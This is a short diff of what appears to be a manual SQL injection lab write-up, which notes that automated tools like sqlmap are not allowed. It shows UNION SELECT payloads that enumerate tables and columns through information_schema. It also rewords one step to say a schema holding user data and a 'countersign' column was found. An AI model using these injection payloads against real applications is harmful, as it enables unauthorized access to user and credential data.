@@ -16,7 +16,7 @@ Since we are not allowed to use automated tools like sqlmap.
 ```
  5 UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
 ```
-3. With this command we get a list with all schemas and tables and their columns searching for some words we found password and user columns on db_default .
+3. With this command we get a list with all schemas and tables and their columns searching for some words we found a schema with all users data like first_name, town and countersign .
 ```
  5 union select table_name, table_schema from information_schema.columns 
  5 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns-- 
